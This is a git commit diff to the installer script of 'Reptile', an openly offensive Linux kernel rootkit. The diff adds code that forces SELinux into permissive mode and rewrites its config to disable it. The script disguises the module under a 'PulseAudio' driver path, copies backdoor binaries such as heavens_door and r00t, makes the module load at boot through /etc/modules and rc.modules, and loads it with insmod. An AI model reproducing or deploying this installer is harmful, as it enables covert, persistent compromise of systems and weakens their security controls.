611d72f7d998951503f4c49726b24122b5aa6287
f0rb1dd3n <ighor@intruder-security.com>
2018-02-02 14:02:17 -0200

    improving installer script

--- installer.sh
+++ installer.sh
@@ -3,10 +3,10 @@
 # Reptile Install Script
 # Author: F0rb1dd3n
 
-MODULE="rep_mod"
+MODULE="reptile"
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
-DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/reptile"
+DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
 
 function usage {
@@ -36,6 +36,36 @@ function reptile_init {
 		exit
 	}
 
+	if [ -f /etc/selinux/config ]; then
+        	echo -ne "SELinux config found on system!\nChecking SELinux status... "
+        	if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
+                	echo -ne "\e[01;31menforcing\e[00m\n"
+                	echo -n "Trying to set enforce permissive... "
+                	setenforce 0
+                	if [ "$(getenforce)" == "Permissive" ]; then
+                        	echo -e "\e[01;36mDONE!\e[00m"
+                	else
+                        	echo -e "\e[01;31mERROR!\e[00m"
+                	fi
+                	echo -n "Trying to disable SELinux... "
+                	sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config || {
+                        	echo -e "\e[01;31mERROR!\e[00m\n"
+                        	echo -e "\e[01;33mIf your system reboot the selinux will enable and PAM will fail.\e[00m\n"
+                        	echo -e "\e[01;33mI recommend you abort this installation or restore pam_unix.so.\e[00m\n"
+                        	#exit
+                	}
+                	echo -e "\e[01;36mDONE!\e[00m"
+                	echo -e "\e[01;33mMaybe you will need to reboot!\e[00m"
+        	else
+                	echo -e "\e[01;36mclear\e[00m"
+        	fi
+	fi      
+
+	[ ! -e /proc ] && {
+        	echo -e "\nWe're in a horrible jail as /proc doesn't exist. Exiting..."
+        	exit
+	}
+
 	if [ ! -d $DRIVER_DIRECTORY ]; then
         	mkdir -p $DRIVER_DIRECTORY
     	fi
@@ -58,53 +88,53 @@ function reptile_build {
 	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
 	make clean
 
-	mv bin/$MODULE bin/$MODULE.ko
+	mv bin/rep_mod bin/$MODULE.ko
 }
 
 function reptile_install {
 	reptile_init
-    	reptile_build
 
-	echo -e "\n\e[00;31m############################################################################\e[00m\n" 
-	
-	mkdir -p /reptile && \
-	cp bin/$MODULE.ko /reptile/$MODULE.ko && \
-	cp bin/heavens_door /reptile && \
-	cp bin/r00t /reptile && \
-	cp bin/knock_on_heaven /reptile && \
-	cp scripts/kill_door.sh /reptile && \
-	cp scripts/start.sh /reptile && \
-	cp scripts/cleanup.sh /reptile && \
+	echo -ne "\nCompiling... "
+	make all > /dev/null 2>&1 && \
+	make clean > /dev/null 2>&1 && \
+	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
+	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+
+	echo -n "Copying binaries to /$MODULE... "
+	mkdir -p /$MODULE && \
+	cp bin/$MODULE.ko /$MODULE && \
+	cp bin/heavens_door /$MODULE && \
+	cp bin/r00t /$MODULE && \
+	cp bin/knock_on_heaven /$MODULE && \
+	cp scripts/kill_door.sh /$MODULE && \
+	cp scripts/start.sh /$MODULE && \
+	cp scripts/cleanup.sh /$MODULE && \
 	rm -rf bin && \
-	echo -e "\e[01;36mAll binaries was copied to /reptile\e[00m" || {
-		echo -e "\e[01;31mError on copying files to /reptile\e[00m"
-		exit
-	}
-
-    	echo -ne "\nInstalling... "
+	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+    	echo -ne "Installing... "
     
-	cp "/reptile/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
-        	echo -e "" >> /etc/modules
+        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules
-        	chmod +x /etc/rc.modules
-	elif [ "$SYSTEM" == "arch" ]; then
-        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules
+        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules && \
+		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	#elif [ "$SYSTEM" == "arch" ]; then
+        #	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
-	depmod && insmod /reptile/$MODULE.ko && echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	depmod && insmod /$MODULE/$MODULE.ko && \
+	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
-	read -p "Would you like to remove this directory ($PWD) on exit? (YES/NO) (case-sensitive) [NO]: "
-	if [ -z $REPLY ]; then
-    		echo "Not removing $PWD"
-	elif [ "$REPLY" == "YES" ]; then
-    		rm -rf $PWD
-	elif [ "$REPLY" == "NO" ]; then
-    		echo "Not removing $PWD"
+	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
+	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
+        	echo -n "Removing $PWD... "
+        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
+	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
+        	echo -e "Not removing $PWD"
 	else
-    		echo "Invalid option. Not removing."
+        	echo -e "Invalid option. Not removing $PWD"
 	fi
 
 	echo -e "\nInstalation has finished!\n"
@@ -115,11 +145,23 @@ function reptile_remove {
 	echo -e "Command: \e[01;32mkill -50 0 && rmmod rep_mod\e[00m\n"
     	echo -ne "Uninstalling... "
 	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
-	rm -rf /reptile
+	rm -rf /$MODULE
 	rm -rf $DRIVER_DIRECTORY
 	rm -rf /etc/rc.modules
 	echo '' > /etc/modules
 	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
+	
+	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
+	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
+        	echo -n "Removing $PWD... "
+        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
+	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
+        	echo -e "Not removing $PWD"
+	else
+        	echo -e "Invalid option. Not removing $PWD"
+	fi
+
+	echo
 }
 
 case $1 in
